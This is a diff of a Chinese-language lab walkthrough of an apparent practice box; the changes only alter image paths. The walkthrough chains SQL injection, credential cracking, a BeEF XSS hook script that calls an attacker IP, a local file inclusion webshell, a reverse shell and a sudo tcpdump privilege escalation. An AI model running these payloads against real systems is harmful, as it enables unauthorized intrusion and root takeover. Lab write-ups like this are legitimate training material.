@@ -126,75 +126,75 @@ Nmap done: 1 IP address (1 host up) scanned in 7.47 seconds
 ~~~
 
 ## 65535(OpenSSH 6.7p1)
-![](./image/Pasted image 20241026224233.png)
+![](./Pasted image 20241026224233.png)
 存在用户名枚举，暂时搁置
 尝试连接一下，看有什么信息
-![](./image/Pasted image 20241027162443.png)
+![](./Pasted image 20241027162443.png)
 有用户名peter，使用密码inthesource登录
-![](./image/Pasted image 20241029144810.png)
+![](./Pasted image 20241029144810.png)
 连接被关闭，可见密码是正确的
 ## 111(RPCbind)
 看起来并没有启动nfs和nis服务，showmount也证明了服务没有开启
 ## 80(web)
-![](./image/Pasted image 20241027171612.png)
+![](./Pasted image 20241027171612.png)
 查看一下源码，没有什么信息
-![](./image/Pasted image 20241027171645.png)
+![](./Pasted image 20241027171645.png)
 进行一下目录爆破吧
-![](./image/Pasted image 20241027171912.png)
-![](./image/Pasted image 20241027172054.png)
+![](./Pasted image 20241027171912.png)
+![](./Pasted image 20241027172054.png)
 /image目录显示forbidden
 查看一下/blog目录
-![](./image/Pasted image 20241027171830.png)
+![](./Pasted image 20241027171830.png)
 访问到页面
 发现search，sqlmap一把梭发现存在sql注入
-![](./image/Pasted image 20241028182303.png)
+![](./Pasted image 20241028182303.png)
 查看有哪些数据库
-![](./image/Pasted image 20241028182353.png)
+![](./Pasted image 20241028182353.png)
 发现blog和oscommerce两个比较特别的数据库
 #### blog
 查看所有表
-![](./image/Pasted image 20241028182528.png)
+![](./Pasted image 20241028182528.png)
 查看blogphp_users
-![](./image/Pasted image 20241028182619.png)
+![](./Pasted image 20241028182619.png)
 只发现了我们自己注册的账户
 看来要去看看另外一个数据库
 #### oscommerce
-![](./image/Pasted image 20241028182830.png)
+![](./Pasted image 20241028182830.png)
 发现感兴趣的osc_administrators
-![](./image/Pasted image 20241028182915.png)
+![](./Pasted image 20241028182915.png)
 拿到admin的密码hash
 看起来像是md5，先鉴别一下
-![](./image/Pasted image 20241028182951.png)
+![](./Pasted image 20241028182951.png)
 大概率是md5了
-![](./image/Pasted image 20241028183008.png)
+![](./Pasted image 20241028183008.png)
 拿到一组凭据admin::32admin
-![](./image/Pasted image 20241028183124.png)
+![](./Pasted image 20241028183124.png)
 在blog尝试登录似乎失败了，哎，兔子洞
 再回web页面查看有什么信息
-![](./image/Pasted image 20241028192341.png)
+![](./Pasted image 20241028192341.png)
 网站使用的blogphp
-![](./image/Pasted image 20241028192452.png)
+![](./Pasted image 20241028192452.png)
 尝试了本地用户提权，但是就算拿到admin登录blog好像也没什么用
 只能尝试xss了
 结合主页面给的beef
-![](./image/Pasted image 20241028192616.png)
+![](./Pasted image 20241028192616.png)
 我们使用beef-xss进行利用
 查看exp
-![](./image/Pasted image 20241028193353.png)
+![](./Pasted image 20241028193353.png)
 构造payload
 ~~~
 <script src="http://192.168.110.128:3000/hook.js"></script>
 ~~~
-![](./image/Pasted image 20241028195216.png)
+![](./Pasted image 20241028195216.png)
 访问members.html即可触发
-![](./image/Pasted image 20241028201427.png)
+![](./Pasted image 20241028201427.png)
 可以发现左侧靶机的ip上线
 发现了一篇精彩的[文章](https://phreaklets.blogspot.com/2014/04/using-beef-metasploit-to-pop-shell-with.html)，展示了利用msf+beef进行反弹shell
 但是这里我的BeEF迟迟收不到上线的消息，所以干脆在register.html中注入我的payload
-![](./image/Pasted image 20241029144111.png)
-![](./image/Pasted image 20241029144143.png)
+![](./Pasted image 20241029144111.png)
+![](./Pasted image 20241029144143.png)
 收到如图的返回说明session已经建立，用session -i 1 连接（这里的session可能会断，等下一次就好）
-![](./image/Pasted image 20241029144332.png)
+![](./Pasted image 20241029144332.png)
 成功拿到shell，这里要去想一下我们的ssh连接为什么会被关闭
 在/etc/ssh/sshd_config文件中发现
 ~~~
@@ -205,7 +205,7 @@ AddressFamily inet
 ~~~
 可以用`echo "exec sh" > ~/.bashrc`绕过
 再次连接ssh
-![](./image/Pasted image 20241029145247.png)
+![](./Pasted image 20241029145247.png)
 成功拿到立足点
 ## 提权枚举
 ### 升级终端
@@ -215,55 +215,55 @@ export TERM=xterm
 ~~~
 ### 信息枚举
 在/var/www/html/blog/config.php中找到mysql的登录凭据
-![](./image/Pasted image 20241029152649.png)
+![](./Pasted image 20241029152649.png)
 似乎用处不大，暂时保留
 sudo -l
-![](./image/Pasted image 20241029192057.png)
+![](./Pasted image 20241029192057.png)
 没有修改配置文件和设置LD_PRELOAD的权限
 靠apache2提权只能暂时搁置
 cat /etc/passwd
-![](./image/Pasted image 20241029192306.png)
+![](./Pasted image 20241029192306.png)
 有用户peter、milton、blumbergh
 `netstat -tlnp`查看监听中的端口
-![](./image/Pasted image 20241029192612.png)
+![](./Pasted image 20241029192612.png)
 2323似乎是没有扫出来的，看一下开启的是什么服务
 `gerp -rl 2323 /etc  2>/dev/null`
-![](./image/Pasted image 20241029192833.png)
-![](./image/Pasted image 20241029192855.png)
+![](./Pasted image 20241029192833.png)
+![](./Pasted image 20241029192855.png)
 开启的是telnet服务，尝试连接
-![](./image/Pasted image 20241029192949.png)
+![](./Pasted image 20241029192949.png)
 给了一个经纬度地址，google一下
-![](./image/Pasted image 20241029193032.png)
+![](./Pasted image 20241029193032.png)
 定位到了休斯顿
 尝试下其他用户登录
 发现milton::Houston可以登录，得到提示Whose stapler is it（也出现过在web页面）
-![](./image/Pasted image 20241029193141.png)
+![](./Pasted image 20241029193141.png)
 查找一下stapler
-![](./image/Pasted image 20241029194119.png)
-![](./image/Pasted image 20241029194301.png)
+![](./Pasted image 20241029194119.png)
+![](./Pasted image 20241029194301.png)
 回答mine
-![](./image/Pasted image 20241029194531.png)
+![](./Pasted image 20241029194531.png)
 我们变成milton了！
 发现又多了一个8888端口
-![](./image/Pasted image 20241029200248.png)
+![](./Pasted image 20241029200248.png)
 看一下8888是什么服务
-![](./image/Pasted image 20241029200415.png)
+![](./Pasted image 20241029200415.png)
 似乎是nginx
 从浏览器访问发现确实是nginx
-![](./image/Pasted image 20241029200520.png)
+![](./Pasted image 20241029200520.png)
 是之前发现的oscommerce
 在milton的身份下发现无法在这里新建文件，只能利用oscommerce本身的漏洞了
-![](./image/Pasted image 20241029200910.png)
+![](./Pasted image 20241029200910.png)
 查看有文件本地包含漏洞
-![](./image/Pasted image 20241029202145.png)
+![](./Pasted image 20241029202145.png)
 查看有漏洞的文件，发现会先加一个.php后缀
-![](./image/Pasted image 20241029203339.png)
+![](./Pasted image 20241029203339.png)
 新建一个/tmp/shell.php
-![](./image/Pasted image 20241029205307.png)
-![](./image/Pasted image 20241029204658.png)
+![](./Pasted image 20241029205307.png)
+![](./Pasted image 20241029204658.png)
 我们得到了另一个用户的身份
 反弹一个shell
-![](./image/Pasted image 20241029205759.png)
+![](./Pasted image 20241029205759.png)
 终于我们可以愉快的提权了
 tcpdump中有两个参数-z和-Z，前者用来执行一个脚本，后者用来指定tcpdump以哪个用户运行，当可以通过sudo执行时，则可以指定以root用户运行一个脚本，从而提权
 编写提权脚本
@@ -275,6 +275,6 @@ chmod +sx /tmp/rootshell
 sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exp.sh -Z root
 
 执行成功
-![](./image/Pasted image 20241029211226.png)
+![](./Pasted image 20241029211226.png)
 定妆照
-![](./image/Pasted image 20241029211429.png)
+![](./Pasted image 20241029211429.png)
